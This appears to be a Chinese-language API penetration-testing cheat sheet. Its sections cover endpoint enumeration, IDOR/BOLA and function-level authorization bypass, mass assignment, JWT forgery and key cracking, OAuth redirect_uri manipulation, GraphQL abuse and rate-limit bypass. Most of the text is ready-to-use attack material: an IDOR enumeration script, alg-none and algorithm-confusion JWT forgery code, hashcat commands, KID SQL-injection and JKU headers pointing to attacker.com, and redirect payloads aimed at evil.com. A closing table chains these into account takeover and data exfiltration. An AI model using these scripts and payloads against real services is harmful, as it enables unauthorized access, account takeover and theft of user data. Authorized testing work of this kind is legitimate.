# API安全测试参考

## 目录
- [1. API枚举与发现](#1-api枚举与发现)
- [2. 未授权访问](#2-未授权访问)
- [3. BOLA / IDOR (越权)](#3-bola--idor-越权)
- [4. BFLA (功能级越权)](#4-bfla-功能级越权)
- [5. 批量赋值](#5-批量赋值)
- [6. JWT攻击](#6-jwt攻击)
- [7. OAuth / SSO攻击](#7-oauth--sso攻击)
- [8. GraphQL安全](#8-graphql安全)
- [9. 速率限制与业务逻辑](#9-速率限制与业务逻辑)
- [10. API信息泄露](#10-api信息泄露)

---

## 1. API枚举与发现

```bash
# API文档探测
for path in swagger-ui.html swagger.json swagger-ui/ api-docs api/swagger.json \
    v1/api-docs v2/api-docs v3/api-docs openapi.json openapi.yaml \
    graphql playground graphiql docs api/v1/ api/v2/; do
    code=$(curl -s -o /dev/null -w "%{http_code}" "https://target.com/$path")
    [ "$code" != "404" ] && echo "API Doc: $path → $code"
done

# 从JS文件提取API
cat js_files.txt | while read f; do
    curl -s "$f" | grep -oE '(https?://[^"'\'' ]+/api/[a-zA-Z0-9/_-]+|/v[0-9]+/[a-zA-Z0-9/_-]+)' 2>/dev/null
done | sort -u

# API参数发现
arjun -u "https://target.com/api/search"
paramspider -u "https://target.com"
```

---

## 2. 未授权访问

```
测试方法:
1. 删除 Authorization / Token / Cookie → 接口仍返回数据?
2. 使用无效Token → 是否返回401还是200+空数据?
3. 匿名 vs 已登录对比 → 匿名能否访问受保护接口?
4. 方法替换 → GET能否替代POST访问敏感操作?
5. 直接访问管理API路径 → /api/admin /api/v1/admin /api/internal
```

```bash
# 批量未授权检测
cat api_endpoints.txt | while read endpoint; do
    code=$(curl -s -o /dev/null -w "%{http_code}" "https://target.com$endpoint")
    [ "$code" = "200" ] && echo "[!] 未授权: $endpoint → $code"
done
```

---

## 3. BOLA / IDOR (越权)

### 3.1 测试流程

```
Step 1: 用账号A操作 → 抓包记录请求(含A的ID/Token)
Step 2: 替换为账号B的ID → 保持A的Token
Step 3: 如果能访问/修改B的数据 → BOLA确认

关键: IDOR不只改ID参数,还要检查:
- URL路径: /api/users/{id}/orders/{order_id}
- Query参数: ?user_id=123
- POST Body: {"userId": 123, "orderId": 456}
- Header: X-User-Id: 123
- 嵌套ID: {"filters": {"ownerId": 123}}
```

### 3.2 批量IDOR

```python
import requests

session = requests.Session()
session.headers["Authorization"] = "Bearer TOKEN_A"

# 遍历ID范围,检查哪些属于其他用户
for uid in range(1, 10000):
    r = session.get(f"https://target.com/api/users/{uid}/profile")
    if r.status_code == 200 and "current_user_id" not in r.text:
        print(f"[!] IDOR: 可以访问用户 {uid} 的数据")
```

### 3.3 常见IDOR点

```
用户资料: /api/user/{id}/profile
用户订单: /api/user/{id}/orders
用户地址: /api/user/{id}/addresses
用户消息: /api/messages/{id}
文件下载: /api/files/{id}/download
评论/帖子: /api/posts/{id}
收货信息: /api/orders/{id}/shipping
```

---

## 4. BFLA (功能级越权)

```
测试方法:
1. 普通用户Token → 访问管理员API → 成功?
2. 低权限角色 → 调用高权限接口
   /api/admin/users (用户管理)
   /api/admin/config (系统配置)
   /api/admin/logs (日志查看)
   /api/admin/export (数据导出)
3. 检查角色字段: {"role":"user"} → 修改为 {"role":"admin"}

常见BFLA点:
- /api/admin/* 系列接口
- /api/internal/* 内部接口
- /api/debug/* 调试接口
- 管理功能的mutation (GraphQL)
```

---

## 5. 批量赋值

```json
// 尝试在更新请求中注入额外字段
POST /api/user/profile
{
    "nickname": "test",
    "role": "admin",           // 尝试提权
    "isVip": true,             // 尝试开通VIP
    "email": "attacker@evil.com",  // 尝试接管账号
    "phone": "13800000000",    // 尝试绑定手机
    "balance": 999999,         // 尝试修改余额
    "password": "newpass"      // 尝试修改密码
}

// 嵌套对象
{
    "user": {
        "id": 1,
        "role": {"name": "admin"}
    }
}
```

```
检测方法:
1. 抓包分析更新请求,对比请求字段和数据库字段
2. 添加额外字段,观察是否被处理
3. 检查是否使用 mass-assignment 框架(Mongoose populate, SQLAlchemy, Django)
4. 特别关注: role, isAdmin, isVip, balance, email, password, phone
```

---

## 6. JWT攻击

### 6.1 JWT结构

```
Header.Payload.Signature
→ Base64Url(JSON).Base64Url(JSON).Signature
```

### 6.2 攻击方法

**算法篡改为 none**:
```python
import base64, json

header = base64.urlsafe_b64encode(json.dumps({"alg": "none", "typ": "JWT"}).encode()).decode().rstrip("=")
payload = base64.urlsafe_b64encode(json.dumps({"id": 1, "role": "admin"}).encode()).decode().rstrip("=")
token = f"{header}.{payload}."
# Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJpZCI6MSwicm9sZSI6ImFkbWluIn0.
```

**算法混淆 (RS256 → HS256)**:
```python
# 获取公钥 (通常在/.well-known/jwks.json 或 /api/jwks)
# 用公钥作为HS256密钥签名
import jwt
public_key = open("public.pem").read()
token = jwt.encode({"id": 1, "role": "admin"}, public_key, algorithm="HS256")
```

**弱密钥爆破**:
```bash
# hashcat
hashcat -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt

# john
john jwt.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=HMAC-SHA256

# jwt_tool
python3 jwt_tool.py <JWT> -C -d /usr/share/wordlists/rockyou.txt
```

**密钥泄露检测**:
```
# 检查以下位置是否泄露JWT密钥
- JS文件中的硬编码密钥
- .env文件
- API文档示例中的密钥
- GitHub仓库
- 错误信息中泄露
```

**JWK/JKU/KID注入**:
```
# KID注入 (SQL注入)
Header: {"alg": "HS256", "kid": "1' UNION SELECT 'secret'--"}

# JWK注入
Header: {"alg": "RS256", "jwk": {"kty": "oct", "k": "ATTACKER_CONTROLLED_KEY"}}

# JKU注入
Header: {"alg": "RS256", "jku": "https://attacker.com/fake_jwks.json"}
```

---

## 7. OAuth / SSO攻击

### 7.1 redirect_uri 操纵

```
# 开放重定向
https://auth.example.com/oauth/authorize?redirect_uri=https://evil.com

# 参数注入
https://auth.example.com/oauth/authorize?redirect_uri=https://target.com@evil.com
https://auth.example.com/oauth/authorize?redirect_uri=https://target.com%40evil.com
https://auth.example.com/oauth/authorize?redirect_uri=https://target.com/.evil.com
https://auth.example.com/oauth/authorize?redirect_uri=https://evil.com%2ftarget.com
https://auth.example.com/oauth/authorize?redirect_uri=https://target.com%00.evil.com
```

### 7.2 state参数缺失/可预测
```
# 无state → CSRF攻击 (构造恶意授权链接)
# state可预测 → 同上
```

### 7.3 OAuth Token泄露
```
# Token在URL fragment (#)中 → Referer头泄露
# Token在回调URL中 → 日志记录
# Token存储在localStorage → XSS可窃取
```

---

## 8. GraphQL安全

### 8.1 内省

```bash
# 完整Schema
curl -s https://target.com/graphql -H "Content-Type: application/json" \
  -d '{"query":"{__schema{types{name,fields{name,args{name,type{name,kind,ofType{name}}}}}}}}"}'

# 检查内省是否开启
curl -s https://target.com/graphql -H "Content-Type: application/json" \
  -d '{"query":"{__schema{queryType{name}}}"}'
```

### 8.2 嵌套查询DoS
```graphql
{user{friends{friends{friends{friends{friends{friends{name}}}}}}}}
```

### 8.3 mutation越权
```graphql
mutation {
  updateUser(id: 1, input: {role: ADMIN, email: "attacker@evil.com"}) {
    id
    role
  }
}
```

### 8.4 工具
```bash
# GraphQL Voyager (可视化Schema)
# https://github.com/APIs-guru/graphql-voyager

# InQL (Burp插件)
# https://github.com/doyensec/inql
```

---

## 9. 速率限制与业务逻辑

### 9.1 速率限制绕过

```
# 绕过方式
1. X-Forwarded-For: 随机IP
2. Client-IP: 随机IP
3. 多账号Token轮换
4. 注册新账号
5. 分号/点号添加: attacker@evil.com vs attacker@evil.com.
6. URL路径变形: /api/login vs /api//login vs /api/login/
```

### 9.2 业务逻辑测试点

```
- 优惠券: 能否重复使用? 能否叠加? 能否用于过期商品?
- 积分: 能否负数? 能否超出上限?
- 订单: 金额能否为0/负数? 数量能否为负数?
- 支付: 并发支付(只扣一次)? 退款金额>支付金额?
- 验证码: 4位无频率限制? 验证码复用?
- 密码重置: 手机号能否改成自己的?
```

---

## 10. API信息泄露

```
检查点:
- 错误响应: SQL错误 / 堆栈信息 / 内部IP / 文件路径
- 响应头: X-Powered-By / Server / X-Debug
- API版本暴露: /v1/ /v2/ 同时存在
- 分页: 总数泄露 (X-Total-Count: 1000000)
- 用户枚举: 注册/登录错误信息差异
- 调试接口: /debug /actuator /swagger
- 源码泄露: .git / .env / .bak / 备份文件
```

---

## 相关参考与组合链

| 本文件漏洞 | 组合链下一环 | 参考文件 |
|-----------|-------------|---------|
| JWT账号接管 | 调用管理API → 批量数据导出 | [auth-logic.md](auth-logic.md) §越权漏洞 |
| BOLA/IDOR | 批量提取数据 → 敏感信息泄露 | [auth-logic.md](auth-logic.md) §水平越权 |
| OAuth Token窃取 | 用Token访问用户API → 数据泄露 | 本文件 §BOLA/IDOR |
| GraphQL内省 | 发现管理mutation → 垂直越权 | [auth-logic.md](auth-logic.md) §垂直越权 |
| 批量赋值提权 | 获取Admin权限 → 文件上传/命令执行 | [vuln/upload.md](vuln/upload.md) / [vuln/cmdi.md](vuln/cmdi.md) |
| API返回云AK | 接管对象存储 → 写入恶意文件 | [cloud-security.md](cloud-security.md) §对象存储安全 |
| 信息泄露(内网IP) | SSRF探测内网 → 发现Redis/K8s | [vuln/ssrf.md](vuln/ssrf.md) |
| 速率限制绕过 | 短信轰炸 → 验证码爆破 → 账号接管 | [auth-logic.md](auth-logic.md) §验证码漏洞 |
